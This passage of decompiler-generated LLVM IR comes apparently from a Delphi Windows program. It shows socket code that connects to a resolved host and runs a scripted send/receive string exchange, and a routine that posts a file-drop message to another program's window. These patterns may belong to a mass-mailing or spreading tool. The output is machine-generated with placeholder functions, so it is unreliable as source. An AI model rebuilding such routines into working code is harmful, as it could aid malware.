  %115 = inttoptr i32 %114 to i32*, !insn.addr !983
  store i32 %113, i32* %115, align 4, !insn.addr !983
  %116 = call i32 @"@LStrFromChar"(), !insn.addr !984
  %117 = load i32, i32* %21, align 4, !insn.addr !985
  %118 = add i32 %esp.0.reload, -20, !insn.addr !985
  %119 = inttoptr i32 %118 to i32*
  store i32 %117, i32* %119, align 4, !insn.addr !985
  %120 = call i32 @"@LStrCatN"(), !insn.addr !986
  %121 = add i32 %ebx.0.reload, 1, !insn.addr !987
  %122 = load i32, i32* %23, align 4, !insn.addr !988
  %123 = add i32 %122, -1, !insn.addr !988
  %124 = icmp eq i32 %123, 0, !insn.addr !988
  store i32 %123, i32* %23, align 4, !insn.addr !988
  %125 = icmp eq i1 %124, false, !insn.addr !989
  store i32 %118, i32* %esp.0.reg2mem, !insn.addr !989
  store i32 %121, i32* %ebx.0.reg2mem, !insn.addr !989
  br i1 %125, label %dec_label_pc_40543e, label %dec_label_pc_4055dd, !insn.addr !989

dec_label_pc_4055dd:                              ; preds = %dec_label_pc_405589
  %126 = load i32, i32* %119, align 4, !insn.addr !990
  call void @__writefsdword(i32 0, i32 %126), !insn.addr !991
  store i32 4216319, i32* %111, align 4, !insn.addr !992
  %127 = call i32 @"@LStrArrayClr"(), !insn.addr !993
  ret i32 %127, !insn.addr !994
}

define i32 @function_4055f8() local_unnamed_addr {
dec_label_pc_4055f8:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !995
  ret i32 %0, !insn.addr !995
}

define i32 @function_4055fd() local_unnamed_addr {
dec_label_pc_4055fd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !996
}

define i32 @function_4055ff(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4055ff:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !997
}

define i32 @function_405608() local_unnamed_addr {
dec_label_pc_405608:
  %stack_var_-12.0.reg2mem = alloca i32, !insn.addr !998
  %0 = call i32 @function_4036c8(), !insn.addr !999
  %1 = inttoptr i32 %0 to i8*, !insn.addr !1000
  %2 = call %hostent* @gethostbyname(i8* %1), !insn.addr !1001
  %3 = call i32 @"@FillChar"(), !insn.addr !1002
  %4 = icmp eq %hostent* %2, null, !insn.addr !1003
  br i1 %4, label %dec_label_pc_405653, label %dec_label_pc_405631, !insn.addr !1004

dec_label_pc_405631:                              ; preds = %dec_label_pc_405608
  %5 = ptrtoint %hostent* %2 to i32, !insn.addr !1001
  %6 = add i32 %5, 12, !insn.addr !1005
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1005
  %8 = load i32, i32* %7, align 4, !insn.addr !1005
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1006
  %10 = load i32, i32* %9, align 4, !insn.addr !1006
  %11 = inttoptr i32 %10 to i8*, !insn.addr !1007
  %12 = load i8, i8* %11, align 1, !insn.addr !1007
  %13 = sext i8 %12 to i32, !insn.addr !1008
  store i32 %13, i32* %stack_var_-12.0.reg2mem, !insn.addr !1009
  br label %dec_label_pc_405653, !insn.addr !1009

dec_label_pc_405653:                              ; preds = %dec_label_pc_405631, %dec_label_pc_405608
  %stack_var_-12.0.reload = load i32, i32* %stack_var_-12.0.reg2mem
  ret i32 %stack_var_-12.0.reload, !insn.addr !1010
}

define i32 @function_405664() local_unnamed_addr {
dec_label_pc_405664:
  %esp.0.reg2mem = alloca i32, !insn.addr !1011
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-488 = alloca i32, align 4
  %stack_var_-472 = alloca i32, align 4
  %stack_var_-412 = alloca i32, align 4
  %stack_var_-452 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !1012
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1013
  store i32 %2, i32* %stack_var_-452, align 4, !insn.addr !1013
  %3 = ptrtoint i32* %stack_var_-452 to i32, !insn.addr !1013
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1014
  %4 = ptrtoint i32* %stack_var_-412 to i32, !insn.addr !1015
  %5 = trunc i32 %4 to i16, !insn.addr !1015
  %6 = call i32 @WSAStartup(i16 %5, %WSAData* inttoptr (i32 257 to %WSAData*)), !insn.addr !1016
  store i32 2, i32* %stack_var_-472, align 4, !insn.addr !1017
  %7 = ptrtoint i32* %stack_var_-472 to i32, !insn.addr !1017
  %8 = call i32 @socket(i32 0, i32 1, i32 2), !insn.addr !1018
  %9 = icmp eq i32 %8, -1, !insn.addr !1019
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1020
  br i1 %9, label %dec_label_pc_4056f2, label %dec_label_pc_4056b3, !insn.addr !1020

dec_label_pc_4056b3:                              ; preds = %dec_label_pc_405664
  %10 = call i32 @function_405608(), !insn.addr !1021
  %11 = trunc i32 %10 to i16, !insn.addr !1022
  %12 = call i16 @htons(i16 %11), !insn.addr !1022
  store i32 %8, i32* %stack_var_-488, align 4, !insn.addr !1023
  %13 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !1023
  %14 = sext i16 %12 to i32, !insn.addr !1024
  %15 = call i32 @connect(i32 %14, %sockaddr* bitcast (i32* @0 to %sockaddr*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1024
  %16 = icmp eq i32 %15, 0, !insn.addr !1025
  %17 = icmp eq i1 %16, false, !insn.addr !1026
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !1026
  br i1 %17, label %dec_label_pc_4056f2, label %dec_label_pc_4056ea, !insn.addr !1026

dec_label_pc_4056ea:                              ; preds = %dec_label_pc_4056b3
  %18 = inttoptr i32 %0 to i32*, !insn.addr !1027
  store i32 %8, i32* %18, align 4, !insn.addr !1027
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !1028
  br label %dec_label_pc_4056f2, !insn.addr !1028

dec_label_pc_4056f2:                              ; preds = %dec_label_pc_4056ea, %dec_label_pc_4056b3, %dec_label_pc_405664
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %19 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1029
  %20 = load i32, i32* %19, align 4, !insn.addr !1029
  call void @__writefsdword(i32 0, i32 %20), !insn.addr !1030
  %21 = add i32 %esp.0.reload, 8, !insn.addr !1031
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1031
  store i32 4216591, i32* %22, align 4, !insn.addr !1031
  %23 = call i32 @"@LStrClr"(), !insn.addr !1032
  ret i32 %23, !insn.addr !1033
}

define i32 @function_405708() local_unnamed_addr {
dec_label_pc_405708:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1034
  ret i32 %0, !insn.addr !1034
}

define i32 @function_40570d() local_unnamed_addr {
dec_label_pc_40570d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1035
}

define i32 @function_40570f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40570f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1036
}

define i32 @function_405718() local_unnamed_addr {
dec_label_pc_405718:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @closesocket(i32 %0), !insn.addr !1037
  %2 = call i32 @WSACleanup(), !insn.addr !1038
  ret i32 %2, !insn.addr !1039
}

define i32 @function_405724() local_unnamed_addr {
dec_label_pc_405724:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4105 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !1040
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1041
  store i32 %2, i32* %stack_var_-4124, align 4, !insn.addr !1041
  %3 = ptrtoint i32* %stack_var_-4124 to i32, !insn.addr !1041
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1042
  %4 = call i32 @function_4036c8(), !insn.addr !1043
  %5 = call i32 @StrCopy(), !insn.addr !1044
  %6 = call i32 @function_406fcc(i32 4), !insn.addr !1045
  %7 = bitcast i32* %stack_var_-4105 to i8*
  %8 = call i32 @send(i32 %6, i8* nonnull %7, i32 %0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1046
  call void @__writefsdword(i32 0, i32 %0), !insn.addr !1047
  %9 = call i32 @"@LStrClr"(), !insn.addr !1048
  ret i32 %9, !insn.addr !1049
}

define i32 @function_405795() local_unnamed_addr {
dec_label_pc_405795:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1050
  ret i32 %0, !insn.addr !1050
}

define i32 @function_40579a() local_unnamed_addr {
dec_label_pc_40579a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1051
}

define i32 @function_40579c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40579c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1052
}

define i32 @function_4057a4() local_unnamed_addr {
dec_label_pc_4057a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @recv(i32 %0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1053
  %2 = call i32 @StrPas(), !insn.addr !1054
  ret i32 %2, !insn.addr !1055
}

define i32 @function_4057d0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4057d0:
  %esp.1.reg2mem = alloca i32, !insn.addr !1056
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1056
  %esp.0.reg2mem = alloca i32, !insn.addr !1056
  %ecx.0.reg2mem = alloca i32, !insn.addr !1056
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1057
  store i32 8, i32* %ecx.0.reg2mem, !insn.addr !1058
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1058
  br label %dec_label_pc_4057d9, !insn.addr !1058

dec_label_pc_4057d9:                              ; preds = %dec_label_pc_4057d9, %dec_label_pc_4057d0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1059
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1059
  store i32 0, i32* %2, align 4, !insn.addr !1059
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1060
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1060
  store i32 0, i32* %4, align 4, !insn.addr !1060
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1061
  %6 = icmp eq i32 %5, 0, !insn.addr !1061
  %7 = icmp eq i1 %6, false, !insn.addr !1062
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1062
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1062
  br i1 %7, label %dec_label_pc_4057d9, label %dec_label_pc_4057e0, !insn.addr !1062

dec_label_pc_4057e0:                              ; preds = %dec_label_pc_4057d9
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1063
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1063
  store i32 0, i32* %9, align 4, !insn.addr !1063
  %10 = call i32 @function_4036b8(), !insn.addr !1064
  %11 = call i32 @function_4036b8(), !insn.addr !1065
  %12 = call i32 @function_4036b8(), !insn.addr !1066
  %13 = call i32 @function_4036b8(), !insn.addr !1067
  %14 = call i32 @function_4036b8(), !insn.addr !1068
  %15 = call i32 @function_4036b8(), !insn.addr !1069
  %16 = call i32 @function_4036b8(), !insn.addr !1070
  %17 = add i32 %esp.0.reload, -20, !insn.addr !1071
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1071
  %19 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1071
  store i32 %19, i32* %18, align 4, !insn.addr !1071
  %20 = add i32 %esp.0.reload, -24, !insn.addr !1072
  %21 = inttoptr i32 %20 to i32*, !insn.addr !1072
  store i32 4217413, i32* %21, align 4, !insn.addr !1072
  %22 = call i32 @__readfsdword(i32 0), !insn.addr !1073
  %23 = add i32 %esp.0.reload, -28, !insn.addr !1073
  %24 = inttoptr i32 %23 to i32*
  store i32 %22, i32* %24, align 4, !insn.addr !1073
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1074
  %25 = call i32 @function_405664(), !insn.addr !1075
  %26 = icmp eq i32 %25, 0, !insn.addr !1076
  store i32* %24, i32** %.pre-phi.reg2mem, !insn.addr !1077
  store i32 %23, i32* %esp.1.reg2mem, !insn.addr !1077
  br i1 %26, label %dec_label_pc_405a10, label %dec_label_pc_40584e, !insn.addr !1077

dec_label_pc_40584e:                              ; preds = %dec_label_pc_4057e0
  %27 = add i32 %esp.0.reload, -32, !insn.addr !1078
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1078
  store i32 ptrtoint ([6 x i8]* @global_var_405a60 to i32), i32* %28, align 4, !insn.addr !1078
  %29 = add i32 %esp.0.reload, -36, !insn.addr !1079
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1079
  %31 = add i32 %esp.0.reload, -40, !insn.addr !1080
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1080
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %32, align 4, !insn.addr !1080
  %33 = call i32 @"@LStrCatN"(), !insn.addr !1081
  %34 = call i32 @function_405724(), !insn.addr !1082
  %35 = call i32 @function_4057a4(), !insn.addr !1083
  %36 = call i32 @function_405724(), !insn.addr !1084
  %37 = call i32 @function_4057a4(), !insn.addr !1085
  %38 = call i32 @"@LStrCat"(), !insn.addr !1086
  %39 = call i32 @function_405724(), !insn.addr !1087
  %40 = call i32 @function_4057a4(), !insn.addr !1088
  %41 = call i32 @"@LStrCat"(), !insn.addr !1089
  %42 = call i32 @function_405724(), !insn.addr !1090
  %43 = call i32 @function_4057a4(), !insn.addr !1091
  %44 = add i32 %esp.0.reload, -44, !insn.addr !1092
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1092
  store i32 ptrtoint ([13 x i8]* @global_var_405a94 to i32), i32* %45, align 4, !insn.addr !1092
  %46 = add i32 %esp.0.reload, -48, !insn.addr !1093
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1093
  store i32 %arg1, i32* %47, align 4, !insn.addr !1093
  %48 = add i32 %esp.0.reload, -52, !insn.addr !1094
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1094
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %49, align 4, !insn.addr !1094
  %50 = add i32 %esp.0.reload, -56, !insn.addr !1095
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1095
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %51, align 4, !insn.addr !1095
  %52 = call i32 @"@LStrCatN"(), !insn.addr !1096
  %53 = call i32 @function_405724(), !insn.addr !1097
  %54 = call i32 @function_4057a4(), !insn.addr !1098
  %55 = add i32 %esp.0.reload, -60, !insn.addr !1099
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1099
  store i32 ptrtoint ([11 x i8]* @global_var_405ab8 to i32), i32* %56, align 4, !insn.addr !1099
  %57 = add i32 %esp.0.reload, -64, !insn.addr !1100
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1100
  store i32 %arg2, i32* %58, align 4, !insn.addr !1100
  %59 = add i32 %esp.0.reload, -68, !insn.addr !1101
  %60 = inttoptr i32 %59 to i32*, !insn.addr !1101
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %60, align 4, !insn.addr !1101
  %61 = add i32 %esp.0.reload, -72, !insn.addr !1102
  %62 = inttoptr i32 %61 to i32*, !insn.addr !1102
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %62, align 4, !insn.addr !1102
  %63 = call i32 @"@LStrCatN"(), !insn.addr !1103
  %64 = call i32 @function_405724(), !insn.addr !1104
  %65 = call i32 @function_4057a4(), !insn.addr !1105
  %66 = call i32 @function_405724(), !insn.addr !1106
  %67 = call i32 @function_4057a4(), !insn.addr !1107
  %68 = add i32 %esp.0.reload, -76, !insn.addr !1108
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1108
  store i32 ptrtoint ([8 x i8]* @global_var_405adc to i32), i32* %69, align 4, !insn.addr !1108
  %70 = add i32 %esp.0.reload, -80, !insn.addr !1109
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1109
  store i32 %arg1, i32* %71, align 4, !insn.addr !1109
  %72 = add i32 %esp.0.reload, -84, !insn.addr !1110
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1110
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %73, align 4, !insn.addr !1110
  %74 = add i32 %esp.0.reload, -88, !insn.addr !1111
  %75 = inttoptr i32 %74 to i32*, !insn.addr !1111
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %75, align 4, !insn.addr !1111
  %76 = add i32 %esp.0.reload, -92, !insn.addr !1112
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1112
  store i32 ptrtoint ([6 x i8]* @global_var_405aec to i32), i32* %77, align 4, !insn.addr !1112
  %78 = add i32 %esp.0.reload, -96, !insn.addr !1113
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1113
  store i32 %arg2, i32* %79, align 4, !insn.addr !1113
  %80 = add i32 %esp.0.reload, -100, !insn.addr !1114
  %81 = inttoptr i32 %80 to i32*, !insn.addr !1114
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %81, align 4, !insn.addr !1114
  %82 = add i32 %esp.0.reload, -104, !insn.addr !1115
  %83 = inttoptr i32 %82 to i32*, !insn.addr !1115
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %83, align 4, !insn.addr !1115
  %84 = add i32 %esp.0.reload, -108, !insn.addr !1116
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1116
  store i32 ptrtoint ([10 x i8]* @global_var_405afc to i32), i32* %85, align 4, !insn.addr !1116
  %86 = add i32 %esp.0.reload, -112, !insn.addr !1117
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1117
  store i32 %arg3, i32* %87, align 4, !insn.addr !1117
  %88 = add i32 %esp.0.reload, -116, !insn.addr !1118
  %89 = inttoptr i32 %88 to i32*, !insn.addr !1118
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %89, align 4, !insn.addr !1118
  %90 = add i32 %esp.0.reload, -120, !insn.addr !1119
  %91 = inttoptr i32 %90 to i32*, !insn.addr !1119
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %91, align 4, !insn.addr !1119
  %92 = add i32 %esp.0.reload, -124, !insn.addr !1120
  %93 = inttoptr i32 %92 to i32*, !insn.addr !1120
  store i32 %arg4, i32* %93, align 4, !insn.addr !1120
  %94 = add i32 %esp.0.reload, -128, !insn.addr !1121
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1121
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %95, align 4, !insn.addr !1121
  %96 = add i32 %esp.0.reload, -132, !insn.addr !1122
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1122
  store i32 ptrtoint (i32* @global_var_405b10 to i32), i32* %97, align 4, !insn.addr !1122
  %98 = add i32 %esp.0.reload, -136, !insn.addr !1123
  %99 = inttoptr i32 %98 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %99, align 4, !insn.addr !1123
  %100 = call i32 @"@LStrCatN"(), !insn.addr !1124
  %101 = call i32 @function_405724(), !insn.addr !1125
  %102 = call i32 @function_4057a4(), !insn.addr !1126
  %103 = call i32 @function_405724(), !insn.addr !1127
  %104 = call i32 @function_4057a4(), !insn.addr !1128
  %105 = call i32 @function_405718(), !insn.addr !1129
  store i32* %99, i32** %.pre-phi.reg2mem, !insn.addr !1130
  store i32 %98, i32* %esp.1.reg2mem, !insn.addr !1130
  br label %dec_label_pc_405a10, !insn.addr !1130

dec_label_pc_405a10:                              ; preds = %dec_label_pc_40584e, %dec_label_pc_4057e0
  %106 = add i32 %esp.0.reload, -16, !insn.addr !1131
  %107 = inttoptr i32 %106 to i32*, !insn.addr !1131
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %108 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1132
  call void @__writefsdword(i32 0, i32 %108), !insn.addr !1133
  %109 = add i32 %esp.1.reload, 8, !insn.addr !1134
  %110 = inttoptr i32 %109 to i32*, !insn.addr !1134
  store i32 4217420, i32* %110, align 4, !insn.addr !1134
  %111 = call i32 @"@LStrArrayClr"(), !insn.addr !1135
  %112 = call i32 @"@LStrArrayClr"(), !insn.addr !1136
  %113 = call i32 @"@LStrArrayClr"(), !insn.addr !1137
  ret i32 %113, !insn.addr !1138
}

define i32 @function_405a45() local_unnamed_addr {
dec_label_pc_405a45:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1139
  ret i32 %0, !insn.addr !1139
}

define i32 @function_405a4a() local_unnamed_addr {
dec_label_pc_405a4a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1140
}

define i32 @function_405a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405a4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1141
}

define i32 @function_405b17() local_unnamed_addr {
dec_label_pc_405b17:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1142
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1142
  store i32 %3, i32* %4, align 4, !insn.addr !1142
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1143
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1143
  %9 = add i8 %6, %8, !insn.addr !1143
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1143
  store i8 %9, i8* %10, align 1, !insn.addr !1143
  %11 = add i32 %2, 85, !insn.addr !1144
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1144
  %13 = load i8, i8* %12, align 1, !insn.addr !1144
  %14 = trunc i32 %1 to i8, !insn.addr !1144
  %15 = add i8 %13, %14, !insn.addr !1144
  store i8 %15, i8* %12, align 1, !insn.addr !1144
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1145
  store i32 %16, i32* %stack_var_-16, align 4, !insn.addr !1145
  %17 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1145
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1146
  %18 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1147
  %19 = add i32 %18, 1, !insn.addr !1147
  %20 = icmp eq i32 %19, 0, !insn.addr !1147
  store i32 %19, i32* @global_var_4096b4, align 4, !insn.addr !1147
  %21 = icmp eq i1 %20, false, !insn.addr !1148
  br i1 %21, label %dec_label_pc_405b51, label %dec_label_pc_405b3d, !insn.addr !1148

dec_label_pc_405b3d:                              ; preds = %dec_label_pc_405b17
  %22 = call i32 @"@LStrClr"(), !insn.addr !1149
  %23 = call i32 @"@LStrClr"(), !insn.addr !1150
  br label %dec_label_pc_405b51, !insn.addr !1150

dec_label_pc_405b51:                              ; preds = %dec_label_pc_405b3d, %dec_label_pc_405b17
  %24 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1151
  call void @__writefsdword(i32 0, i32 %24), !insn.addr !1152
  ret i32 0, !insn.addr !1153
}

define i32 @function_405b5f() local_unnamed_addr {
dec_label_pc_405b5f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1154
  ret i32 %0, !insn.addr !1154
}

define i32 @function_405b64() local_unnamed_addr {
dec_label_pc_405b64:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1155
}

define i32 @function_405b66(i32 %arg1) local_unnamed_addr {
dec_label_pc_405b66:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1156
}

define i32 @function_405b68() local_unnamed_addr {
dec_label_pc_405b68:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1157
  %2 = add i32 %1, -1, !insn.addr !1157
  store i32 %2, i32* @global_var_4096b4, align 4, !insn.addr !1157
  ret i32 %0, !insn.addr !1158
}

define i32 @function_405b70() local_unnamed_addr {
dec_label_pc_405b70:
  %esp.0.reg2mem = alloca i32, !insn.addr !1159
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1160
  %2 = icmp eq i32 %0, 0, !insn.addr !1161
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1162
  br i1 %2, label %dec_label_pc_405c7a, label %dec_label_pc_405b8a, !insn.addr !1162

dec_label_pc_405b8a:                              ; preds = %dec_label_pc_405b70
  %3 = call i32 @function_4036c8(), !insn.addr !1163
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1164
  store i8* %4, i8** %stack_var_-28, align 4, !insn.addr !1164
  %5 = ptrtoint i8** %stack_var_-28 to i32, !insn.addr !1164
  %6 = call i1 @PathFileExistsA(i8* %4), !insn.addr !1165
  %7 = icmp eq i1 %6, false, !insn.addr !1166
  store i32 %5, i32* %esp.0.reg2mem, !insn.addr !1167
  br i1 %7, label %dec_label_pc_405c7a, label %dec_label_pc_405ba5, !insn.addr !1167

dec_label_pc_405ba5:                              ; preds = %dec_label_pc_405b8a
  %8 = load i8*, i8** %stack_var_-28, align 4
  %9 = call i32* @FindWindowExA(i32* null, i32* bitcast ([7 x i8]* @global_var_405c88 to i32*), i8* null, i8* %8), !insn.addr !1168
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1168
  store i32 %10, i32* %stack_var_-48, align 4, !insn.addr !1169
  %11 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1169
  %12 = call i1 @IsWindow(i32* %9), !insn.addr !1170
  %13 = icmp eq i1 %12, false, !insn.addr !1171
  store i32 %11, i32* %esp.0.reg2mem, !insn.addr !1172
  br i1 %13, label %dec_label_pc_405c7a, label %dec_label_pc_405bce, !insn.addr !1172

dec_label_pc_405bce:                              ; preds = %dec_label_pc_405ba5
  %14 = call i32 @function_4034c8(), !insn.addr !1173
  %15 = add i32 %14, 22, !insn.addr !1174
  store i32 66, i32* %stack_var_-56, align 4, !insn.addr !1175
  %16 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1175
  %17 = call i32* @GlobalAlloc(i32 %15, i32 66), !insn.addr !1176
  %18 = icmp eq i32* %17, null, !insn.addr !1177
  store i32 %16, i32* %esp.0.reg2mem, !insn.addr !1178
  br i1 %18, label %dec_label_pc_405c7a, label %dec_label_pc_405bed, !insn.addr !1178

dec_label_pc_405bed:                              ; preds = %dec_label_pc_405bce
  %19 = call i32* @GlobalLock(i32* nonnull %17), !insn.addr !1179
  %20 = icmp eq i32* %19, null, !insn.addr !1180
  %21 = icmp eq i1 %20, false, !insn.addr !1181
  br i1 %21, label %dec_label_pc_405c01, label %dec_label_pc_405bf9, !insn.addr !1181

dec_label_pc_405bf9:                              ; preds = %dec_label_pc_405bed
  %22 = bitcast i32* %17 to i8*, !insn.addr !1182
  store i8* %22, i8** %stack_var_-64, align 4, !insn.addr !1182
  %23 = ptrtoint i8** %stack_var_-64 to i32, !insn.addr !1182
  %24 = call i32* @GlobalFree(i32* nonnull %17), !insn.addr !1183
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1184
  br label %dec_label_pc_405c7a, !insn.addr !1184

dec_label_pc_405c01:                              ; preds = %dec_label_pc_405bed
  %25 = ptrtoint i32* %17 to i32, !insn.addr !1176
  %26 = ptrtoint i32* %19 to i32, !insn.addr !1179
  store i32 20, i32* %19, align 4, !insn.addr !1185
  %27 = add i32 %26, 4, !insn.addr !1186
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1186
  store i32 0, i32* %28, align 4, !insn.addr !1186
  %29 = add i32 %26, 8, !insn.addr !1187
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1187
  store i32 0, i32* %30, align 4, !insn.addr !1187
  %31 = add i32 %26, 12, !insn.addr !1188
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1188
  store i32 0, i32* %32, align 4, !insn.addr !1188
  %33 = add i32 %26, 16, !insn.addr !1189
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1189
  store i32 0, i32* %34, align 4, !insn.addr !1189
  %35 = call i32 @function_4036c8(), !insn.addr !1190
  %36 = inttoptr i32 %35 to i8*, !insn.addr !1191
  store i8* %36, i8** %stack_var_-64, align 4, !insn.addr !1191
  %37 = add i32 %26, 20, !insn.addr !1192
  %38 = inttoptr i32 %37 to i8*, !insn.addr !1193
  %39 = call i8* @lstrcpyA(i8* %36, i8* %38), !insn.addr !1194
  %40 = call i1 @GlobalUnlock(i32* nonnull %17), !insn.addr !1195
  %41 = call i1 @PostMessageA(i32* null, i32 %25, i32 563, i32 %10), !insn.addr !1196
  %42 = call i32 @function_406f2c(i32 4218000, i32 2000, i32 -1), !insn.addr !1197
  store i32 %42, i32* %stack_var_-104, align 4, !insn.addr !1198
  %43 = ptrtoint i32* %stack_var_-104 to i32, !insn.addr !1198
